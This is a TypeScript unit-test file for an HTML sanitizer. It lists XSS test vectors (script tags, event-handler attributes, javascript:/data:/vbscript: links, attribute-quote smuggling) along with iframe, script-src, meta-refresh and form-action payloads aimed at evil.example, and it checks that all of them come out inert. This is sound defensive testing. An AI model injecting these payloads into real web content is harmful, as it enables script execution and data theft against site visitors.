/* WEB-247 sanitizer corpus — studio-authored rich text is rendered to third
 * parties (emails, contracts, booking pages); every vector here must come
 * out inert. Pure unit tests (no DB). */
import { describe, expect, it } from "vitest";

import { renderSafeHtml, sanitizeRichText } from "@/lib/sanitize";

const CORPUS: Array<[label: string, input: string, banned: RegExp[]]> = [
  ["script tag", "<p>ok</p><script>alert(1)</script>", [/script/i, /alert/]],
  ["script with attrs", '<SCRIPT SRC=https://evil.example/x.js></SCRIPT>', [/evil\.example/i, /script/i]],
  ["iframe", '<iframe src="https://evil.example"></iframe>', [/iframe/i, /evil\.example/i]],
  ["img onerror", '<img src=x onerror="alert(1)">', [/onerror/i, /<img/i, /alert/i]],
  ["svg onload", "<svg onload=alert(1)>hi</svg>", [/svg/i, /onload/i, /alert/]],
  ["a javascript: href", '<a href="javascript:alert(1)">click</a>', [/javascript:/i]],
  ["a data: href", '<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>', [/data:/i]],
  ["a vbscript href", '<a href="vbscript:msgbox(1)">x</a>', [/vbscript:/i]],
  ["inline event on allowed tag", '<p onclick="alert(1)">hi</p>', [/onclick/i, /alert/]],
  ["style attr", '<p style="background:url(javascript:alert(1))">hi</p>', [/style=/i, /javascript:/i]],
  ["style element", "<style>body{background:url(https://evil.example)}</style><p>ok</p>", [/style/i, /evil\.example/i]],
  ["href with quotes escape attempt", '<a href="https://good.example" "onmouseover=alert(1)">x</a>', [/onmouseover/i]],
  ["quoted gt in attr smuggle", '<a href="https://x.example/a>" onmouseover="alert(1)">x</a>', [/onmouseover/i]],
  ["comment payload", "<!-- <script>alert(1)</script> --><p>ok</p>", [/script/i, /alert/]],
  ["cdata", "<![CDATA[<script>alert(1)</script>]]><p>ok</p>", [/<script/i, /<!\[CDATA/i]],
  ["uppercase tag names", "<P>hi</P><STRONG>x</STRONG>", [/<SCRIPT/i]],
  ["unterminated tag renders as text", "<p>hi<script alert(1)", [/<script/i]],
  ["nested malicious", "</p><script><p>inner</p></script>", [/script/i]],
  ["object/embed", '<object data="https://evil.example"></object><embed src="https://evil.example">', [/object/i, /embed/i, /evil\.example/i]],
  ["meta refresh", '<meta http-equiv="refresh" content="0;url=https://evil.example">', [/meta/i, /evil\.example/i]],
  ["form/input injection", '<form action="https://evil.example"><input name="x">', [/form/i, /input/i, /evil\.example/i]],
];

describe("sanitizeRichText — XSS corpus (WEB-247)", () => {
  for (const [label, input, banned] of CORPUS) {
    it(`neutralizes ${label}`, () => {
      const out = sanitizeRichText(input);
      for (const re of banned) expect(out).not.toMatch(re);
    });
  }

  it("keeps the allowlist intact (formatting survives, clean attrs)", () => {
    const html = '<p>Hi <strong>there</strong> <em>you</em> <u>two</u></p><h3>Title</h3><blockquote>quote</blockquote><ul><li>one</li><li>two</li></ul><br><h4>sub</h4>';
    expect(sanitizeRichText(html)).toBe(html);
  });

  it("keeps https and mailto anchors, adds safety rel", () => {
    expect(sanitizeRichText('<a href="https://example.com/a?b=1">link</a>')).toBe(
      '<a href="https://example.com/a?b=1" target="_blank" rel="noopener noreferrer">link</a>',
    );
    expect(sanitizeRichText('<a href="mailto:hi@example.com">mail</a>')).toBe(
      '<a href="mailto:hi@example.com" target="_blank" rel="noopener noreferrer">mail</a>',
    );
  });

  it("strips disallowed attrs from anchors but keeps the link", () => {
    const out = sanitizeRichText('<a href="https://example.com" class="big" target="_self" style="color:red">x</a>');
    expect(out).toBe('<a href="https://example.com" target="_blank" rel="noopener noreferrer">x</a>');
  });

  it("drops anchor with a relative href (only https/mailto pass)", () => {
    const out = sanitizeRichText('<a href="/admin">x</a>');
    expect(out).toBe("<a>x</a>");
  });

  it("drops unknown tags but keeps their inner text", () => {
    expect(sanitizeRichText("<div><span>keep me</span></div>")).toBe("keep me");
    expect(sanitizeRichText("line1<hr>line2")).toBe("line1line2");
  });

  it("escapes bare text and entities stay stable (idempotent)", () => {
    expect(sanitizeRichText("a < b & c > d")).toBe("a &lt; b &amp; c &gt; d");
    const once = sanitizeRichText("Tom &amp; Jerry");
    expect(once).toBe("Tom &amp; Jerry");
    expect(sanitizeRichText(once)).toBe(once);
    // An escaped &lt;script&gt; the studio typed renders as text, not a tag:
    expect(sanitizeRichText("&lt;script&gt;x&lt;/script&gt;")).toBe("&lt;script&gt;x&lt;/script&gt;");
  });

  it("balances unclosed tags so formatting cannot bleed into the page shell", () => {
    expect(sanitizeRichText("<strong>unclosed")).toBe("<strong>unclosed</strong>");
    expect(sanitizeRichText("<ul><li>one")).toBe("<ul><li>one</li></ul>");
    expect(sanitizeRichText("<em>a</u></em>b")).toBe("<em>a</em>b"); // stray closer dropped
  });

  it("auto-closes implicit li/p siblings", () => {
    expect(sanitizeRichText("<ul><li>one<li>two</ul>")).toBe("<ul><li>one</li><li>two</li></ul>");
    expect(sanitizeRichText("<p>a<p>b")).toBe("<p>a</p><p>b</p>");
  });

  it("treats a lone < as literal text", () => {
    expect(sanitizeRichText("3 < 5")).toBe("3 &lt; 5");
  });

  it("renderSafeHtml is the same function", () => {
    expect(renderSafeHtml).toBe(sanitizeRichText);
  });
});
